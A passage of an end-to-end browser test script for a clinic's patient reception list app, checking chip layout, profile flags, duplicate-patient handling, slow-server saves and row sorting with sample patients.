    if (count.textContent !== (hidden.length ? `+${hidden.length}` : count.dataset.plain) || hidden.some((c) => !tip.includes(c.title))) miscounted.push(`${count.textContent} ${tip}`);
    chips.forEach((p, i) => {
      const n = p.querySelector('.person-name');
      const name = [...n.childNodes].filter((c) => c.nodeType === Node.TEXT_NODE).map((c) => c.textContent).join('').trim();
      const cut = n.scrollWidth > n.clientWidth + 0.5;
      if (/^Dr\b/.test(p.title) && !/^(Checked by )?Dr\.? /.test(n.textContent)) unreadable.push(`${name}: no "Dr." read out`);
      if (cut && !p.title.includes(name)) unreadable.push(name);
      if (laptop && i === 0 && cut) firstCut.push(name);
      if (laptop && cut && !hidden.includes(p) && n.clientWidth < 40) unreadable.push(`${name}: ${n.clientWidth}px`);
    });
  }
  const wrap = document.querySelector('.sheet-wrap');
  wrap.scrollTop = 0; wrap.scrollLeft = 0; window.scrollTo(0, 0);
  return { laptop, n: xs.length, all: all.length, people: document.querySelectorAll('table.sheet tbody .person').length, blocked, unreadable, firstCut, miscounted, hiddenChips, hiddenReachable, shownUnhovered };
};
await step('busy day at 1366x768: a chip\'s × shows only over the chip under the mouse or with the keyboard on it (it takes no room), the first name of a row is whole, the others show a few letters at least or are counted in the "+", and the "+" dialog lists who is on the visit with Remove and Undo', async () => {
  await pb.mouse.move(0, 0);
  // (the list is sorted like the sheet, so the rows with the most chips, Completed, are at the bottom, where the toast of
  //  the payment taken above sits for a few seconds: it is let go first)
  await pb.waitForFunction(() => !document.querySelector('#toasts .toast'), null, { timeout: 15000 });
  const c = await pb.evaluate(checkChips);
  assert.ok(c.laptop && c.people >= 140 && c.n >= 120, 'chips, each with a ×: ' + JSON.stringify(c));
  assert.deepEqual(c.shownUnhovered, [], 'a × in sight with no mouse or keyboard on its chip');
  assert.deepEqual(c.blocked, [], 'a × that does not take the click: ' + JSON.stringify(c.blocked));
  assert.deepEqual(c.firstCut, [], 'a first name cut short');
  assert.deepEqual(c.unreadable, [], 'a name that cannot be read');
  assert.deepEqual(c.miscounted, [], 'a "+" that does not count the chips out of sight');
  assert.ok(c.hiddenChips > 0 && c.hiddenChips < 20, 'a few chips out of sight, counted in their "+": ' + c.hiddenChips);
  assert.deepEqual(c.hiddenReachable, [], 'a chip out of sight whose × can be reached with Tab');
  // the × shows on hover and with the keyboard, over the end of its chip
  const r1x = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 001' });
  const shown = async (x) => x.evaluate((el) => { const r = el.getBoundingClientRect(); const c = el.closest('.person').getBoundingClientRect(); return getComputedStyle(el).opacity === '1' && r.right <= c.right + 0.5 && r.left >= c.left - 0.5 && r.width >= 24 && r.height >= 24; });
  await r1x.locator('.person').first().hover();
  assert.ok(await shown(r1x.locator('.person').first().locator('.chip-remove')), 'the × over the chip under the mouse');
  await pb.mouse.move(0, 0);
  await r1x.locator('select[aria-label^="Doctor group for"]').focus();
  await pb.keyboard.press('Tab');
  assert.match(await pb.evaluate(() => document.activeElement?.getAttribute('aria-label')), /^Remove .+ from Sample Patient 001$/, 'Tab from Group reaches the first chip\'s ×');
  assert.ok(await pb.evaluate(() => getComputedStyle(document.activeElement).opacity === '1'), 'and it shows');
  await pb.evaluate(() => document.activeElement?.blur());
  // the checker of Sample Patient 001, removed and brought back from the "+" dialog
  const r1 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 001' });
  const name = (await r1.locator('.person.checker').getAttribute('title')).replace(/ \(checked\)$/, '');
  await r1.locator('.add-person').click();
  const dlg = pb.locator('.modal');
  await dlg.locator('.people-on-list li', { hasText: `Checked by: ${name}` }).waitFor();
  assert.ok(await dlg.locator('.people-on-list li', { hasText: /^Doctor: / }).count(), 'the doctor is listed too');
  await dlg.getByRole('button', { name: `Remove ${name} (checker) from Sample Patient 001` }).click();
  await r1.locator('.person.checker').waitFor({ state: 'detached' });
  await dlg.locator('.people-on-undo', { hasText: `${name} removed.` }).waitFor();
  assert.equal(await pb.evaluate(() => document.activeElement?.textContent), 'Undo', 'the cursor is on the Undo of the dialog');
  await dlg.locator('.people-on-undo').getByRole('button', { name: 'Undo' }).click();
  await r1.locator('.person.checker').waitFor();
  await pb.waitForFunction((n) => document.activeElement?.getAttribute('aria-label') === `Remove ${n} (checker) from Sample Patient 001`, name);
  await dlg.getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
});
await step('round 3: no flags on the list: no See Dr. Ali, medical, dues or note marker beside any name (dues stay in the P.P column), and the row\'s dialog still has them', async () => {
  // Owner, 11 Oct 2026: "the flags column shouldn't be here, it should be marked like this on the patient's profile where
  // his details and bills are". (Sample Patient 111 has a medical history, the Dr. Ali flag and a note; 021 has dues.)
  const marks = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup) th.name-col')]
    .flatMap((th) => [...th.querySelectorAll('.badge, .name-flags, .note-mark')].map((el) => `${th.textContent.trim()}: ${el.className}`)));
  assert.deepEqual(marks, [], 'markers beside a name');
  assert.equal(await pb.getByRole('button', { name: 'Sample Patient 111', exact: true }).count(), 1, 'the name reads as the name alone');
  assert.match(await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 021' }).locator('td.pp').innerText(), /^11\.5k/, 'dues stay in the P.P column');
  // the row's dialog (a click on the name) is as it was: medical history, the Dr. Ali flag and the note
  await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 111' }).locator('.name-btn').click();
  const m = pb.locator('.modal');
  await m.locator('h2:has-text("Sample Patient 111")').waitFor();
  assert.match((await m.locator('.alert').allInnerTexts()).join(' | '), /Medical history: Diabetes.*Flagged: next appointment should be with Dr\. Ali Rashid/s);
  assert.equal(await m.getByLabel('Notes').inputValue(), 'Wants an evening slot next time');
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
});
await step('round 3: the patient\'s profile shows those flags beside the name: Medical history, See Dr. Ali, dues and the latest visit note', async () => {
  // "Open profile" in the row's dialog
  await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 111' }).locator('.name-btn').click();
  await pb.locator('.modal').getByRole('button', { name: 'Open profile' }).click();
  await pb.locator('h1:text-is("Sample Patient 111")').waitFor();
  const badges = await pb.locator('.profile-head .profile-flags .badge').allInnerTexts();
  const at = (re) => badges.findIndex((t) => re.test(t));
  assert.ok(at(/Medical history/) === 0 && at(/^See Dr\. Ali$/) === 1, 'medical history, then See Dr. Ali, first: ' + JSON.stringify(badges));
  assert.ok(at(/^Note \(.+\): Wants an evening slot next time$/) === 2 && at(/public photo consent/) > 2, 'then the latest visit note, before the consent badges: ' + JSON.stringify(badges));
  assert.match(await pb.locator('.profile-flags .badge-note').getAttribute('title'), /^Visit note, .+: Wants an evening slot next time$/);
  await shot(pb, '23-profile-flags');
  // a patient with dues (P.P 11.5k on the list): the dues badge
  const id = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === 'Sample Patient 021').patient_id;
  });
  await pb.evaluate((pid) => { location.hash = `#/staff/patient/${pid}`; }, id);
  await pb.locator('h1:text-is("Sample Patient 021")').waitFor();
  assert.match(await pb.locator('.profile-head .profile-flags .badge-dues').innerText(), /Pending dues Rs 11,500/);
  assert.equal(await pb.locator('.profile-flags .badge-note, .profile-flags .badge-ali').count(), 0, 'no note or Dr. Ali flag for this one');
  // back to the busy list (the demo keeps its data in memory: never reload)
  await pb.evaluate(() => { location.hash = '#/staff/sheet?demo=busy'; });
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120);
});
await step('busy day: the Mr# of a patient already on the list adds no second row (a booked patient is marked Waiting); picked from the matches, it asks first', async () => {
  const box = pb.locator('.add-panel input[type=search]');
  const count = () => pb.locator('table.sheet tbody tr').count();
  const before = await count();
  // Sample Patient 113 is booked: now Waiting with a token, the cursor in their Treatment cell
  await box.fill('7113');
  await box.press('Enter');
  await pb.waitForSelector('.toast:has-text("Sample Patient 113 was booked: now Waiting with token")');
  const r113 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 113' });
  assert.equal(await r113.count(), 1, 'one row for Sample Patient 113');
  assert.equal(await r113.locator('select[aria-label^="Status for"]').inputValue(), 'waiting');
  assert.match(await r113.locator('.token').innerText(), /\d/);
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label="Treatment for Sample Patient 113"]'));
  // Saad Malik is Waiting already: the cursor goes to his Status
  await box.fill('9826');
  await box.press('Enter');
  await pb.waitForSelector('.toast:has-text("Saad Malik is already on the list (token 3)")');
  await pb.waitForFunction(() => document.activeElement?.matches('select[aria-label="Status for Saad Malik"]'));
  assert.equal(await count(), before, 'no row added');
  assert.equal(await box.inputValue(), '');
  // picked from the matches: asked first, and "Go to the row" adds nothing
  await box.fill('Saad Malik');
  await pb.locator('.add-panel .suggestions button', { hasText: 'Mr# 9826' }).click();
  await pb.locator('.modal h2:has-text("Saad Malik is already on the list (token 3)")').waitFor();
  await pb.locator('.modal').getByRole('button', { name: 'Go to the row' }).click();
  await pb.waitForFunction(() => document.activeElement?.matches('select[aria-label="Status for Saad Malik"]'));
  assert.equal(await count(), before, 'still no row added');
});
await step('busy day, slow server: the add box is empty at once after Enter, so a second Mr# typed meanwhile is added too, and text typed while an add is on its way stays in the box', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__fast = { searchPatients: d.searchPatients, addVisit: d.addVisit };
    const later = (fn) => async (...a) => { await new Promise((r) => setTimeout(r, 450)); return fn.apply(d, a); };
    d.searchPatients = later(window.__fast.searchPatients);
    d.addVisit = later(window.__fast.addVisit);
  });
  const box = pb.locator('.add-panel input[type=search]');
  const before = await pb.locator('table.sheet tbody tr').count();
  await box.fill('9822');
  await box.press('Enter');
  assert.equal(await box.inputValue(), '', 'emptied at once');
  await box.pressSequentially('9823');
  await box.press('Enter');
  await pb.waitForFunction((n) => document.querySelectorAll('table.sheet tbody tr').length === n + 2, before);
  for (const mr of ['9822', '9823']) assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 1, `Mr# ${mr} added once`);
  await box.fill('9824');
  await box.press('Enter');
  await box.pressSequentially('Scal');
  await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9824' }).waitFor();
  await pb.waitForTimeout(300);
  assert.equal(await box.inputValue(), 'Scal', 'what was typed meanwhile is kept');
  assert.ok(await box.evaluate((el) => el === document.activeElement), 'and the cursor stays in the box');
  await box.fill('');
  await pb.keyboard.press('Escape');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); Object.assign(state.data, window.__fast); });
});
await step('busy day, slow server: four Mr#s typed back to back are all added, and an add that comes back after the next Enter never takes the cursor out of the add box (no Treatment is changed)', async () => {
  // Each add waits until the test lets it go, so it comes back after the next Mr# has been entered, with the box empty.
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__fastAdd = d.addVisit;
    window.__held = [];
    window.__adds = 0;
    d.addVisit = async (...a) => { window.__adds++; await new Promise((r) => window.__held.push(r)); return window.__fastAdd.apply(d, a); };
  });
  const cells = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const visits = await state.data.listVisits({ branchId: 1, date: localISO() });
    const checkups = await state.data.listDayCheckups({ branchId: 1, date: localISO() });
    return Object.fromEntries([...visits.map((v) => [v.id, `${v.patient.mr_number} ${v.treatment_label}|${v.details_text}`]), ...checkups.map((c) => [c.id, `${c.patient_name} ${c.checkup_for}|${c.details}`])]);
  });
  const before = await cells();
  const box = pb.locator('.add-panel input[type=search]');
  const adds = (n) => pb.waitForFunction((k) => window.__adds >= k, n);
  const letGo = () => pb.evaluate(() => window.__held.shift()());
  const inBox = () => pb.evaluate(() => document.activeElement?.matches('.add-panel input[type=search]'));
  await box.focus();
  await pb.keyboard.type('9828', { delay: 60 });
  await pb.keyboard.press('Enter');
  await adds(1);
  await pb.keyboard.type('9829', { delay: 60 });
  await pb.keyboard.press('Enter');
  await adds(2);
  await letGo(); // 9828 comes back now: the box is empty, but 9829 was entered since
  await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9828' }).waitFor();
  await pb.waitForTimeout(100);
  assert.ok(await inBox(), 'the cursor stays in the add box');
  await pb.keyboard.type('9830', { delay: 60 });
  await pb.keyboard.press('Enter');
  await adds(3);
  await letGo(); // 9829
  await pb.keyboard.type('9831', { delay: 60 });
  await pb.keyboard.press('Enter');
  await adds(4);
  await letGo(); // 9830
  await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9830' }).waitFor();
  await pb.waitForTimeout(100);
  assert.ok(await inBox(), 'still in the add box');
  await letGo(); // 9831, the last one: nothing entered since, so the cursor goes to its Treatment cell as usual
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label="Treatment for Laraib Fatima"]'));
  for (const mr of ['9828', '9829', '9830', '9831']) assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 1, `Mr# ${mr} added once`);
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  const after = await cells();
  const changed = Object.keys(before).filter((id) => after[id] !== before[id]).map((id) => `${before[id]} -> ${after[id]}`);
  assert.deepEqual(changed, [], 'no Treatment or details changed');
  const added = Object.keys(after).filter((id) => !(id in before)).map((id) => after[id]).sort();
  assert.deepEqual(added, ['9828 Checkup|', '9829 Checkup|', '9830 Checkup|', '9831 Checkup|']);
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.addVisit = window.__fastAdd; });
});
await step('status change with the dues override: Dr. Ali starts treatment for a patient with dues when the clinic holds for dues', async () => {
  const px = await newPage();
  await loginAs(px, 'Dr. Ali Rashid');
  await px.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setSetting('dues_hold_mode', 'block'); });
  await px.goto(BASE + '#/staff/sheet?branch=1');
  const row = px.locator('table.sheet tbody tr', { hasText: 'Fatima Noor' });
  await row.waitFor();
  assert.ok(await row.locator('td.pp .pp-due').count(), 'Fatima Noor has dues');
  await row.locator('select[aria-label^="Status for"]').selectOption('in_treatment');
  await px.locator('.modal h2:has-text("Pending dues")').waitFor();
  await px.locator('.modal').getByRole('button', { name: 'Override and start treatment' }).click();
  await px.waitForFunction(() => {
    const s = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Fatima Noor'))?.querySelector('select[aria-label^="Status for"]');
    return s?.value === 'in_treatment' && s.classList.contains('gs-green');
  });
  assert.ok(await px.getByRole('button', { name: 'Download', exact: true }).count(), 'Download for Dr. Ali');
  // the row's actions behind the name include uploading photos for someone allowed to
  await row.locator('.name-btn').click();
  await px.locator('.modal').getByRole('button', { name: 'Upload photos' }).click();
  await px.locator('.modal h2:has-text("Upload photos · Fatima Noor")').waitFor();
  await px.keyboard.press('Escape');
  await px.keyboard.press('Escape');
  await px.close();
});
await step('busy day: the add box is a few Tabs from the toolbar (it comes before the list in the page), and a toast sits above the add line, clear of its buttons and of the Treatment cell of the patient just added', async () => {
  await pb.locator('input[aria-label="Find on this list"]').focus();
  let tabs = 0;
  while (tabs < 20 && !(await pb.evaluate(() => document.activeElement?.matches('.add-panel input[type=search]')))) { await pb.keyboard.press('Tab'); tabs++; }
  assert.ok(tabs <= 12, 'Tab presses from Find to the add box: ' + tabs);
  await pb.keyboard.type('9817');
  await pb.keyboard.press('Enter');
  await pb.waitForSelector('.toast:has-text("Iqra Shahid added")');
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label="Treatment for Iqra Shahid"]'));
  const r = await pb.evaluate(() => {
    const t = [...document.querySelectorAll('.toast')].find((el) => el.textContent.includes('Iqra Shahid added')).getBoundingClientRect();
    const covers = (el) => { const b = el.getBoundingClientRect(); return !(b.right <= t.left || b.left >= t.right || b.bottom <= t.top || b.top >= t.bottom); };
    return { addLine: covers(document.querySelector('.add-panel')), cell: covers(document.activeElement), toast: [t.left, t.top, t.right, t.bottom].map(Math.round) };
  });
  assert.ok(!r.addLine && !r.cell, 'the toast covers neither the add line nor the cell being typed in: ' + JSON.stringify(r));
});
await step('busy day: an Mr# and Enter while a quick filter or Find text hides the new row clears them, so the row is in sight with the cursor in its Treatment cell', async () => {
  const box = pb.locator('.add-panel input[type=search]');
  const find = pb.locator('input[aria-label="Find on this list"]');
  await pb.locator('.sheet-counts button', { hasText: 'Completed' }).click();
  await box.fill('9818');
  await box.press('Enter');
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9818'));
  assert.match(await pb.locator('.sheet-counts button[aria-pressed="true"]').innerText(), /^All/);
  await find.fill('Sample Patient 00');
  await box.fill('9819');
  await box.press('Enter');
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9819'));
  assert.equal(await find.inputValue(), '');
  assert.ok((await pb.locator('table.sheet tbody tr').count()) > 120, 'everyone is shown again');
});
await step('busy day: a status or group picked right after typing in the same row keeps what was typed (the server\'s answer does not have it yet)', async () => {
  const rowOf = (name) => pb.locator('table.sheet tbody tr', { hasText: name });
  // (the row is drawn again from the server's answer: its P.P cell, marked before, is a new cell after; the row with the
  //  cursor keeps the cell the cursor is in, and gets new other cells)
  const redrawn = (name) => pb.waitForFunction((n) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(n)); return tr && !tr.querySelector('td.pp').dataset.before; }, name);
  const typeThenPick = async (name, text, label, value) => {
    await rowOf(name).locator('input[aria-label^="Treatment details for"]').click();
    await pb.keyboard.type(text);
    await rowOf(name).evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; });
    await rowOf(name).locator(`select[aria-label^="${label}"]`).selectOption(value);
    await redrawn(name);
    assert.equal(await rowOf(name).locator('input[aria-label^="Treatment details for"]').inputValue(), text, `${name}: what was typed is still in the cell`);
  };
  await typeThenPick('Sample Patient 090', 'UL 016', 'Status for', 'in_treatment');
  await typeThenPick('Sample Patient 096', 'brac 35', 'Doctor group for', '2');
  // and it is saved (the typed change waits about half a second before it is sent)
  const savedNow = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const list = await state.data.listVisits({ branchId: 1, date: localISO() });
    return Object.fromEntries(list.filter((v) => /^Sample Patient 09[06]$/.test(v.patient.full_name)).map((v) => [v.patient.full_name, [v.status, v.doctor_group_id, v.details_text]]));
  });
  const want = { 'Sample Patient 090': ['in_treatment', 3, 'UL 016'], 'Sample Patient 096': ['waiting', 2, 'brac 35'] };
  let saved = await savedNow();
  for (let i = 0; i < 25 && JSON.stringify(saved) !== JSON.stringify(want); i++) { await pb.waitForTimeout(200); saved = await savedNow(); }
  assert.deepEqual(saved, want);
});
// (the order of the rows as the sheet sorts them: by status, the checkup rows after the patients of the same status)
const sortedLikeTheSheet = () => {
  const rank = { waiting: 0, in_treatment: 1, scheduled: 2, '': 3, completed: 4, cancelled: 5, no_show: 6 };
  const keys = [...document.querySelectorAll('table.sheet tbody tr[data-id]')]
    .map((t) => rank[t.querySelector('select[aria-label^="Status for"]').value] * 2 + (t.classList.contains('is-checkup') ? 1 : 0));
  return keys.every((k, i) => i === 0 || keys[i - 1] <= k);
};
// (the patients of the list in the order shown, with their numbers)
const listOrder = () => pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr[data-id]')].map((t) => `${t.querySelector('td.rownum').textContent} ${t.querySelector('.name-text')?.textContent || t.querySelector('[data-field=patient_name]')?.value}`));
// (another reception computer: changes made in the data, then the list is told, as by a live update)
const elsewhere = (statuses, add = null) => pb.evaluate(async ([s, mr]) => {
  const { state } = await import('/js/state.js');
  const { localISO } = await import('/js/ui/dom.js');
  const list = await state.data.listVisits({ branchId: 1, date: localISO() });
  for (const [n, status] of Object.entries(s)) await state.data.updateVisit(list.find((v) => v.patient.full_name === n).id, { status });
  let added = null;
  if (mr) {
    const p = (await state.data.searchPatients(mr)).find((x) => x.mr_number === mr);
    added = (await state.data.addVisit({ patient_id: p.id, branch_id: 1, visit_date: localISO(), treatment_label: 'Checkup', status: 'waiting' })).id;
  }
  document.dispatchEvent(new CustomEvent('sheet-reload'));
  return added;
}, [statuses, add]);
await step('busy day: sorted like the sheet and numbered 1..n; a row whose status is changed keeps its place and number while the cursor is in the table, even through a reload, and moves to its new status once the cursor has left it', async () => {
  const rowOf = (name) => pb.locator('table.sheet tbody tr', { hasText: name });
  // (looked up and read in one go: a row found first and read after a redraw of the list would be the old, detached copy)
  const where = (name) => pb.evaluate((who) => {
    const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(who));
    return { at: tr.sectionRowIndex, n: tr.querySelector('td.rownum').textContent, cursorIn: tr.contains(document.activeElement) };
  }, name);
  const sortedAndNumbered = () => {
    const rank = { waiting: 0, in_treatment: 1, scheduled: 2, '': 3, completed: 4, cancelled: 5, no_show: 6 };
    const trs = [...document.querySelectorAll('table.sheet tbody tr[data-id]')];
    const keys = trs.map((t) => rank[t.querySelector('select[aria-label^="Status for"]').value] * 2 + (t.classList.contains('is-checkup') ? 1 : 0));
    return keys.every((k, i) => i === 0 || keys[i - 1] <= k) && trs.every((t, i) => t.querySelector('td.rownum').textContent === String(i + 1));
  };
  // (a row changed by the step above moves once its quiet reload has run)
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForFunction(sortedAndNumbered, null, { timeout: 15000 });
  const before = await where('Sample Patient 105');
  const status = rowOf('Sample Patient 105').locator('select[aria-label^="Status for"]');
  await rowOf('Sample Patient 105').evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; });
  await status.focus(); // (as a click on it would)
  await status.selectOption('completed');
  await pb.waitForFunction(() => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 105')); return tr && !tr.querySelector('td.pp').dataset.before; });
  const saved = await where('Sample Patient 105');
  assert.deepEqual(saved, { ...before, cursorIn: true }, `saved: the row is drawn again in its place, with its number: ${JSON.stringify([before, saved])}`);
  // a reload in the background (once the 5 seconds after the last key or tap are over) while the cursor is still in the
  // table: nothing moves, the row stays with the cursor in it
  await pb.waitForTimeout(5300);
  const order = await listOrder();
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await pb.waitForTimeout(800);
  assert.deepEqual(await listOrder(), order, 'the list was not drawn again in a new order');
  assert.deepEqual(await where('Sample Patient 105'), { ...before, cursorIn: true }, 'the row with the cursor did not move');
  assert.equal(await status.inputValue(), 'completed');
  // the cursor leaves the table: a few seconds after the last key or tap it goes to the Completed rows, and every row is
  // numbered 1..n again
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.waitForFunction((at) => [...document.querySelectorAll('table.sheet tbody tr')].findIndex((t) => t.textContent.includes('Sample Patient 105')) > at, before.at, { timeout: 15000 });
  assert.ok(await pb.evaluate(sortedAndNumbered), 'sorted and numbered 1..n again');
  assert.notEqual((await where('Sample Patient 105')).n, before.n, 'it has the number of its new place');
  await pb.evaluate(() => document.activeElement?.blur());
});
// (waiting sample patients without dues that no step below needs as they are)
const spareWaiting = () => pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')]
  .filter((t) => t.querySelector('select[aria-label^="Status for"]').value === 'waiting').map((t) => t.querySelector('.name-text').textContent)
  .filter((name) => { const n = Number(name.replace('Sample Patient ', '')); return n % 7 && n % 11 && n % 13 && ![87, 88, 89, 94, 95, 97, 100].includes(n); }));
await step('busy day: under the Waiting filter, a row whose status is changed stays shown with the cursor in it, even through a reload, and goes once the cursor has left the table (the rows below never move meanwhile)', async () => {
  const waitingChip = pb.locator('.sheet-counts button', { hasText: 'Waiting' });
  await waitingChip.click();
  await pb.waitForFunction(() => [...document.querySelectorAll('table.sheet tbody tr[data-id]')].every((t) => t.querySelector('select[aria-label^="Status for"]').value === 'waiting'));
  const name = (await spareWaiting())[2];
  const row = pb.locator('table.sheet tbody tr', { hasText: name });
  const status = row.locator('select[aria-label^="Status for"]');
  // (looked up and read in one go, as where() above)
  const at = () => pb.evaluate((who) => {
    const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === who);
    return [tr.sectionRowIndex, tr.contains(document.activeElement)];
  }, name);
  const before = await at();
  await row.evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; });
  await status.focus(); // (as a click on it would)
  await status.selectOption('in_treatment');
  await pb.waitForFunction((n) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(n)); return tr && !tr.querySelector('td.pp').dataset.before; }, name);
  // a reload in the background, once the 5 seconds after the last key or tap are over (a live update, the 20-second check)
  await pb.waitForTimeout(5300);
  const order = await listOrder();
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await pb.waitForTimeout(800);
  assert.deepEqual(await at(), [before[0], true], `${name}: still shown, in its place, with the cursor`);
  assert.deepEqual(await listOrder(), order, 'no row moved');
  assert.equal(await status.inputValue(), 'in_treatment');
  // the cursor leaves the table: it is not Waiting any more, so it goes a few seconds after the last key or tap
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await row.waitFor({ state: 'detached', timeout: 15000 });
  assert.ok(await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr[data-id]')].every((t) => t.querySelector('select[aria-label^="Status for"]').value === 'waiting')), 'only Waiting rows');
  await waitingChip.click(); // (all rows again)
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr[data-id]').length > 120);
});
await step('busy day, slow server: Enter on a status chip saves it without opening its list, so Shift+Tab reaches Treatment and what is typed there is saved too (it never becomes a pick from the list)', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__updateVisit = d.updateVisit;
    d.updateVisit = async (...a) => { await new Promise((r) => setTimeout(r, 700)); return window.__updateVisit.apply(d, a); };
  });
  const name = (await spareWaiting())[0];
  const row = pb.locator('table.sheet tbody tr', { hasText: name });
  const was = await row.locator(`input[aria-label="Treatment for ${name}"]`).inputValue();
  await row.locator('select[aria-label^="Status for"]').focus();
  await pb.keyboard.press('ArrowDown');
  await pb.keyboard.press('Enter');
  assert.equal(await pb.evaluate(() => document.activeElement.matches(':open')), false, 'the list is not open');
  await pb.keyboard.press('Shift+Tab');
  assert.equal(await pb.evaluate(() => document.activeElement.getAttribute('aria-label')), `Treatment for ${name}`);
  await pb.keyboard.press('End');
  await pb.keyboard.type(' scaling', { delay: 30 });
  await pb.waitForTimeout(1000); // (the status answer has come back and the row is drawn again)
  await pb.keyboard.press('Tab');
  const savedNow = () => pb.evaluate(async (n) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === n);
    return [v.status, v.treatment_label];
  }, name);
  const want = ['in_treatment', `${was} scaling`];
  let saved = await savedNow();
  for (let i = 0; i < 30 && JSON.stringify(saved) !== JSON.stringify(want); i++) { await pb.waitForTimeout(200); saved = await savedNow(); }
  assert.deepEqual(saved, want);
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__updateVisit; document.activeElement?.blur(); });
});
await step('busy day, slow server: text typed in a Treatment cell (it saves when the cell is left) while the same row\'s status is being saved stays in the cell when the row is drawn again, and is saved', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__updateVisit = d.updateVisit;
    d.updateVisit = async (...a) => { await new Promise((r) => setTimeout(r, 1500)); return window.__updateVisit.apply(d, a); };
  });
  const r100 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 100' });
  const cell = r100.locator('input[aria-label="Treatment for Sample Patient 100"]');
  await r100.locator('select[aria-label^="Status for"]').selectOption('in_treatment');
  await r100.evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; }); // (the row's cells drawn again from the status answer are new cells)
  await cell.click();
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('RCT 2nd sitting');
  await pb.waitForFunction(() => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 100')); return tr && !tr.querySelector('td.pp').dataset.before; });
  assert.equal(await r100.locator('select[aria-label^="Status for"]').inputValue(), 'in_treatment');
  assert.equal(await cell.inputValue(), 'RCT 2nd sitting', 'what was typed is still in the cell');
  assert.ok(await cell.evaluate((el) => el === document.activeElement), 'and the cursor is still in it');
  await pb.keyboard.type(' more');
  await pb.keyboard.press('Tab');
  const savedNow = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === 'Sample Patient 100');
    return [v.status, v.treatment_label];
  });
  let saved = await savedNow();
  for (let i = 0; i < 25 && saved[1] !== 'RCT 2nd sitting more'; i++) { await pb.waitForTimeout(200); saved = await savedNow(); }
  assert.deepEqual(saved, ['in_treatment', 'RCT 2nd sitting more']);
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__updateVisit; });
});
await step('busy day, slow server: a reload in the background that comes back while someone types in a cell does not wipe what they typed; it is drawn once they leave the list', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__listVisits = d.listVisits;
